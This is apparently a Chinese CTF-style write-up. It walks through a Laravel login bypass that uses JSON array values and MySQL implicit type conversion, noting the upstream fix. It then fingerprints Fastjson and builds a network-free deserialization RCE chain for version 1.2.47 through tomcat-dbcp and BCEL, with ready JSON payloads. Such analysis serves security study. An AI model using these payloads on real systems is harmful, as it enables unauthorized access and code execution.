<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16321904151167.jpg" alt="-w1321"><br>尝试把Content-Type修改为application/json后提交，提示空参数值，然后把post修改为对应的json内容,{“username”:”aa”,”password”:”aa”}。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16321904596942.jpg" alt="-w1625"></p>
<p>不再提示空参数值，说明框架是支持APPLICATION/JSON的，解析出了POST包。当弱类型语言框架支持json时，用户很有可能可以控制变量的数据类型(基础数据类型)。</p>
<p>再回到登录功能，实现登录功能通常有两种方法<br>1、通过username查询出密码，再将提交的密码与查询出的密码对比<br>2、将username和password同时带入到SQL中，检测是否有查询出数据</p>
<p>假如是场景1，当可以控制数据类型时，控制密码为bool true，如果登录时使用的”==”对比密码即可登录成功。但是这个场景利用成功率不高，通常在登录时后端会对密码hash后再对比，bool true hash后又变成了string，并且需要知道用户名才能够利用，<br><code>&#123;&quot;username&quot;:&quot;$admin$&quot;,&quot;password&quot;:true&#125;</code>, 构造数据包爆破了一波用户名最后失败。</p>
<p>那么大概率还是场景2，但是在场景2中也没法绕过密码被hash的这个点。</p>
<p>场景2，大概可以猜测出laravel控制器中的代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$username = $request-&gt;input(<span class="string">&#x27;username&#x27;</span>);</span><br><span class="line">$password = $request-&gt;input(<span class="string">&#x27;password&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($username) || <span class="keyword">empty</span>($password))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;empty para!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$password = md5($password);</span><br><span class="line">$user = user::where(<span class="string">&#x27;username&#x27;</span>, $username)</span><br><span class="line">    -&gt;where(<span class="string">&#x27;password&#x27;</span>, $password)-&gt;first();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($user)&#123;</span><br><span class="line">    <span class="comment">// set session</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;Login Faild!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>回到laravel中，分析下laravel的代码。在laravel中，通常使用$request-&gt;input来接收gpc参数，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params">$key = <span class="literal">null</span>, $default = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> data_get(</span><br><span class="line">              <span class="keyword">$this</span>-&gt;getInputSource()-&gt;all() + <span class="keyword">$this</span>-&gt;query-&gt;all(), $key, $default</span><br><span class="line">); &#125;</span><br></pre></td></tr></table></figure>

<p>input中又调用了getInputSource方法，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getInputSource</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isJson()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;json();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> in_array(<span class="keyword">$this</span>-&gt;getRealMethod(), [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;HEAD&#x27;</span>]) ? <span class="keyword">$this</span>-&gt;query : <span class="keyword">$this</span>-&gt;request;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在getInputSource方法中，会判断是否为json请求，如果是json请求就调用对应的json方法来解析参数。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isJson</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Str::contains(<span class="keyword">$this</span>-&gt;header(<span class="string">&#x27;CONTENT_TYPE&#x27;</span>), [<span class="string">&#x27;/json&#x27;</span>, <span class="string">&#x27;+json&#x27;</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>通过Content-type来判断是否为json请求，如果content-type中含有/json或+json时即认定为json请求。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">json</span>(<span class="params">$key = <span class="literal">null</span>, $default = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;json)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;json = <span class="keyword">new</span> ParameterBag((<span class="keyword">array</span>) json_decode(<span class="keyword">$this</span>-&gt;getContent(), <span class="literal">true</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_null($key)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;json;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> data_get(<span class="keyword">$this</span>-&gt;json-&gt;all(), $key, $default);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在json方法中，也就是用的php自带的json_decode解析参数值(其实在Request::capture方法中，就已经设置好了json)。</p>
<p>密码在md5后，就带入到了where中进行查询。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">where</span>(<span class="params">$column, $operator = <span class="literal">null</span>, $value = <span class="literal">null</span>, $boolean = <span class="string">&#x27;and&#x27;</span></span>)</span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">  Omit  .......................................................</span><br><span class="line">          <span class="keyword">if</span> (! $value <span class="keyword">instanceof</span> Expression) &#123;</span><br><span class="line">              <span class="keyword">$this</span>-&gt;addBinding($value, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>主要关注参数绑定这一块，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addBinding</span>(<span class="params">$value, $type = <span class="string">&#x27;where&#x27;</span></span>)</span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> (! array_key_exists($type, <span class="keyword">$this</span>-&gt;bindings)) &#123;</span><br><span class="line">              <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">InvalidArgumentException</span>(<span class="string">&quot;Invalid binding type: <span class="subst">&#123;$type&#125;</span>.&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">              <span class="keyword">$this</span>-&gt;bindings[$type] = array_values(array_merge(<span class="keyword">$this</span>-&gt;bindings[$type], $va</span><br><span class="line">  lue));</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="keyword">$this</span>-&gt;bindings[$type][] = $value;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>在绑定参数时，如果我们传递过来的参数值是数组，那么会调用array_merge将它合并到bindings[‘where’]中，也就是说通过数组我们可以传多个元素到bindings中，刚好通过json可以控制变量为数组类型。</p>
<p>能够传多个元素有什么用呢?</p>
<p>登录的预编译SQL为, select * from users where username = ? and password = ?</p>
<p>存在两个占位符，通过数组控制username为[“a”,”b”]，密码为”c”</p>
<p>bindings[‘where’]的值为 array(“a”,”b”,”4a8a08f09d37b73795649038408b5f33”)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bindValues</span>(<span class="params">$statement, $bindings</span>)</span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">          <span class="keyword">foreach</span> ($bindings <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">              $statement-&gt;bindValue(</span><br><span class="line">                  is_string($key) ? $key : $key + <span class="number">1</span>,</span><br><span class="line">                  $value,</span><br><span class="line">                  is_int($value) ? PDO::PARAM_INT : PDO::PARAM_STR</span><br><span class="line">); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后遍历bindings绑定值，SQL中只存在两个占位符，bindings里却有三个元素，这样就会把最后一个元素给挤出SQL中(也就是hash后的密码)。<br>最后的SQL语句为，select * from users where username = ‘a’ and password = ‘b’<br>把Hash后的密码挤出SQL后，意味着能控制密码的数据类型了。<br>能够控制账号密码的数据类型后又有什么作用呢？再回到bindValues中，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$statement-&gt;bindValue(</span><br><span class="line">                  is_string($key) ? $key : $key + <span class="number">1</span>,</span><br><span class="line">                  $value,</span><br><span class="line">                  is_int($value) ? PDO::PARAM_INT : PDO::PARAM_STR</span><br><span class="line">); &#125;</span><br></pre></td></tr></table></figure>
<p>在bindvalue时，会判断绑定值的数据类型，如果是int那么就会使用PDO::PARAM_INT,也就是SQL中不会加单引号,不过就算不加单引号因为只能是数字也不能SQL注入。</p>
<p>Laravel通常与MySQL搭配，虽然不能SQL注入，但是MySQL存在隐式数据类型转换功能。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select &#39;a1&#39; &#x3D; 0;</span><br><span class="line">+----------+</span><br><span class="line">| &#39;a1&#39; &#x3D; 0 |</span><br><span class="line">+----------+</span><br><span class="line">|        1 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select &#39;1a&#39; &#x3D; 0;</span><br><span class="line">+----------+</span><br><span class="line">| &#39;1a&#39; &#x3D; 0 |</span><br><span class="line">+----------+</span><br><span class="line">|        0 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select &#39;1a&#39; &#x3D; 1;</span><br><span class="line">+----------+</span><br><span class="line">| &#39;1a&#39; &#x3D; 1 |</span><br><span class="line">+----------+</span><br><span class="line">|        1 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select &#39;12a&#39; &#x3D; 12;</span><br><span class="line">+------------+</span><br><span class="line">| &#39;12a&#39; &#x3D; 12 |</span><br><span class="line">+------------+</span><br><span class="line">|          1 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>如果一个字符串与数字对比，字符串会尝试转换为数字后再进行对比，这个转换结果与php的intval类似。<br>如果字符串以0-9开头，会一直转换直到出现非0-9字符。<br>如果字符串不以0-9开头，会转换为0。</p>
<p>这里有一个例外就是科学计数，如果字符串是’2e5xxxxx’转换后不是2而是200000.</p>
<p>用户名通常为字符开头，设置为0即可。<br>密码MD5的合法字符为A-F 0-9, 如果运气比较好密码以A-F开头，也设置为0即可，如果以数字开头就需要进行爆破了。</p>
<p>在PHP中，empty(0)为true, 所以通过username传入array设置密码，同时password传入任意字符串也绕过了empty的限制。</p>
<p>通过JSON控制用户名，<br>{“username”:[0,0],”password”:”1”}<br>最后的SQL语句为 select * from users where username = 0 and password = 0</p>
<p>一年前和laravel官方沟通了下这个问题，他们觉得这个还是应该由开发者来验证用户输入的数据类型，所以不准备修复这个问题，后续我就没去关注过了。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16321872039702.jpg" alt="-w899"></p>
<p>最近在写这篇文章时，又去下载最新版复现了下这个问题，发现已经无法复现了。<br>去排查了下原因，发现我邮件这人还是发布了一个commit。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/laravel/framework/commit/006873df411d28bfd03fea5e7f91a2afe3918498">https://github.com/laravel/framework/commit/006873df411d28bfd03fea5e7f91a2afe3918498</a></p>
<p>从v8.23.0起，修复了该问题。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! $value <span class="keyword">instanceof</span> Expression) &#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;addBinding(is_array($value) ? head($value) : $value, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当绑定值类型是数组时，只会将数组的第一个元素添加到bindings中，无法再将hash后的密码挤出SQL。</p>
<p>v8.24.0起变为了，<br><code>$this-&gt;addBinding($this-&gt;flattenValue($value), &#39;where&#39;);</code><br>和23的原理也是一样的。</p>
<p>不过input依然支持JSON，可能在另外一些场景依然存在类似的问题，类似输入卡密充值等功能，依然能够用来爆破卡密。</p>
<p>再回到题目中，<br>{“username”:[0,0],”password”:”1”}<br>登录失败，说明密码可能是0-9开头， ​需要爆破一下，在爆破到37时进入了后台</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16321949173288.jpg"></p>
<p>{“username”:[0,37],”password”:”1”}</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16321950005158.jpg"></p>
<p>在后台中也没有什么可玩的功能，唯一可玩的也就检测漏洞这个功能了。</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16321950475819.jpg"></p>
<p>使用该功能时提示权限不足，说明存在多个用户组，需要爆破其他的账户，接着把密码37往下跑就能跑出其他的账户。</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16321950664523.jpg" alt="-w583"></p>
<p>最终在478时跑出了高权限账户，数据库中真实的记录如下</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line">+<span class="comment">----+----------+----------------------------------+----------------------+-------+</span></span><br><span class="line">| id | username | password                         | email                | group |</span><br><span class="line">+<span class="comment">----+----------+----------------------------------+----------------------+-------+</span></span><br><span class="line">|  1 | yulegeyu | 478bf953fb3a2235845bd72c8e33a132 | root@yulegeyu.com    | admin |</span><br><span class="line">|  2 | xiaoyu   | 37ee389fa5c95baee4bd6267910443fa | yulegeyu@foxmail.com | user  |</span><br><span class="line">+<span class="comment">----+----------+----------------------------------+----------------------+-------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<h2 id="2、Fastjson-利用"><a href="#2、Fastjson-利用" class="headerlink" title="2、Fastjson 利用"></a>2、Fastjson 利用</h2><p>(这一章节是去年写的了，当时用的是express不是laravel，所以其中涉及到了一点点express，不过不影响直接拿来用下)</p>
<p>登录高权限账户后，再次使用检测功能<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16321950979786.jpg"></p>
<p>看起来是一个类似pocsuite的功能，输入网址后可以加载插件检测是否存在该漏洞,抓个包看一下。</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16321951527521.jpg"></p>
<p>调用api检测是否存在该漏洞，根据404页面发现后端使用的Springboot。</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16321980126429.jpg"><br>同时id参数存在SQL注入，不过是低权限注入没啥用。</p>
<p>看到java+json，就会想到fastjson，虽然springboot默认使用的是jackson，但是很多开发者还是会用httpMessageConvert转换为fastjson使用。</p>
<p>探测下是否使用的fastjson，</p>
<p>1、 提交 {}<br>    返回 “msg”:”请选择漏洞!”,</p>
<p>2、提交 {“@type”:”java.net.Inet6Address”,”val”:”127.0.0.1”}<br>    返回  Bad Request</p>
<p>可能是因为Contoller接收RequestBody时设置了期望对象。如果Fastjson设置了期望对象,会在反序列之前检测反序列生成对象和期望对象是否有继承关系或类型是否相等，如果无关系则会在反序列之前抛出type not match异常。</p>
<p>3、提交{“c”:{“@type”:”java.net.Inet6Address”,”val”:”127.0.0.1”}}<br>返回 “msg”:”请选择漏洞!” </p>
<p>基本可确认是fastjson了，但是Inet6Address是一个全版本都可使用的链，需要用InetAddress才能确定fastjson是否为&lt;48的版本。</p>
<p>4、提交{“c”:{“@type”:”java.net.InetAddress”,”val”:”asd.bayebz.dnslog.cn”}}<br>返回 Bad Request, 并且无dns请求记录。</p>
<p>无dns请求记录并不能说明目标一定是无漏洞版本，很有可能是目标未配置dns，无网在实际场景中出现频率也很高。所以解析asd.bayebz.dnslog.cn时抛出了UnknownHostException异常，最终返回了Bad Request</p>
<p>5、提交{“c”:{“@type”:”java.net.InetAddress”,”val”:”127.0.0.1”}}<br>返回正常     “msg”:”请选择漏洞!”,</p>
<p>虽然无dns服务器无法解析域名，但是ip通过InetAdress还是ok的，借此能够验证目标fastjson&lt;1.2.48。</p>
<p>6、提交 {“c”:{“@type”:”xx”}}<br>返回 Bad Request</p>
<p>说明fastjson &gt;1.2.24。</p>
<p>经过探测可以确认fastjson处于 1.2.24 - 1.2.48之间(实际为1.2.47版本)，现在就需要解决fastjson无网利用的问题，大部分利用都还是依靠的jndi注入，无法在当前环境下使用。<br>Fastjson无网利用基本就那几种，一个一个测就完事。</p>
<p>7、提交 {“x”:{“@type”:”org.apache.tomcat.dbcp.dbcp.BasicDataSource”}}<br>返回 “msg”:”请选择漏洞!”,</p>
<p>根据返回可知存在tomcat-dbcp,可使用tomcat-dbcp实现无网利用（tomcat lib目录下自带了tomcat-dbcp，所以普通tomcat能够直接使用该利用。不过spring的tomcat里没tomcat-dbcp,一开始准备直接用tomcat的更真实一点，不过后面为了方便还是用了spring手动添加dbcp)</p>
<p>1.2.24版本以前网上的公开利用，可实现任意代码执行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">        &quot;c&quot;: &#123;</span><br><span class="line">            &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,</span><br><span class="line">            &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;driverClassName&quot;: &quot;$$BCEL$$xxxxxx&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      :&quot;ddd&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>现在需要借助java.lang.Class 将org.apache.tomcat.dbcp.dbcp.BasicDataSource、com.sun.org.apache.bcel.internal.util.ClassLoader加入到缓存中。</p>
<p>修改为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;xxx&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;&#125;,&quot;www&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,     &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">        &quot;c&quot;: &#123;</span><br><span class="line">            &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,</span><br><span class="line">            &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;driverClassName&quot;: &quot;$$BCEL$$xxxxx&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      :&quot;ddd&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不过在1.2.47版本中，提交后无任何反应。<br>org.apache.tomcat.dbcp.dbcp.BasicDataSource这条利用链的入口是在getter方法 getConnection中，一般来说反序列都是调用setter方法，序列化才会调用getter方法。</p>
<p>在fastjson&lt;=1.2.36版本中，DefaultJSONParser#parseObject中存在这样一个操作，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (object.getClass() == JSONObject.class) &#123;</span><br><span class="line">    key = key == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : key.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果反序列类为com.alibaba.fastjson.JSONObject，那么会对json中其他key调用toString()方法，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.toJSONString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toJSONString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    SerializeWriter out = <span class="keyword">new</span> SerializeWriter();</span><br><span class="line"></span><br><span class="line">    String var2;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        (<span class="keyword">new</span> JSONSerializer(out)).write(<span class="keyword">this</span>);</span><br><span class="line">        var2 = out.toString();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>toString方法中进行了序列化，进而调用了getter。</p>
<p>在fastjson&gt;1.2.36后，代码发生了变化</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (object.getClass() == JSONObject.class &amp;&amp; key == <span class="keyword">null</span>) &#123;</span><br><span class="line">    key = <span class="string">&quot;null&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>JSONObject不再进行toString操作，所以就没法利用了，不过调用toString方法的地方还有不少，就在原来toString下面几行代码就有。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (object.getClass() == JSONObject.class &amp;&amp; key == <span class="keyword">null</span>) &#123;</span><br><span class="line">    key = <span class="string">&quot;null&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Object value;</span><br><span class="line">Map var27;</span><br><span class="line"><span class="keyword">if</span> (ch == <span class="string">&#x27;&quot;&#x27;</span>) &#123;</span><br><span class="line">    .......</span><br><span class="line">    map.put(key, value);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((ch &lt; <span class="string">&#x27;0&#x27;</span> || ch &gt; <span class="string">&#x27;9&#x27;</span>) &amp;&amp; ch != <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">    .......</span><br><span class="line">    <span class="keyword">this</span>.checkMapResolve(object, key.toString());</span><br></pre></td></tr></table></figure>
<p>这里只要满足冒号后面跟的不是双引号，并且非0-9、- 字符就能够触发到toString序列化方法。<br>所以将:”ddd”修改为:{ 就可以触发到（使用其他调用getter的方法也可以，$.ref、set等)。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;x&quot;</span>:&#123;<span class="string">&quot;xxx&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span>&#125;,<span class="string">&quot;www&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>&#125;,&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,<span class="string">&quot;c&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span>,<span class="string">&quot;driverClassLoader&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>&#125;,<span class="string">&quot;driverClassName&quot;</span>:<span class="string">&quot;$$BCEL$$xxxxx&quot;</span>&#125;&#125;:&#123;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
